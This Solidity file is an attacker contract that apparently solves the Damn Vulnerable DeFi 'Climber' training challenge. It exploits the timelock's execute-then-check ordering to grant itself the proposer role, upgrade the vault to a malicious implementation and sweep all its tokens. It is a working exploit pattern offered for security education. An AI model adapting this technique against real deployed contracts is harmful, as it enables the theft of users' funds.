// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

/**
 * @title ClimberAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberAttacker is AccessControl {
    using Address for address;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address payable private timelock;
    address private vault;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(
        address payable _timelock,
        address _vault
    ) {
        timelock = _timelock;
        vault = _vault;
    }

    function executeOnTimelock(address _vaultPwned, address _token) external {
        // 1) make attacker contract, the proposer
        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "grantRole(bytes32,address)", PROPOSER_ROLE, address(this)
        ));

        // 2) upgrade ClimberVault -> ClimberVaultPwned and initialize the latter
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", _vaultPwned, abi.encodeWithSignature('initialize(address)', msg.sender)
        ));

        // 3) sweep proxy off of all DVTs using ClimberVaultPwned
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "sweepFunds(address)", _token
        ));

        // schedule 1, 2, 3, and this scheduling txn
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "scheduleAll()"
        ));

        salt = bytes32('xyz');

        ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
    }

    function scheduleAll() external {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }

    receive() external payable {}
}
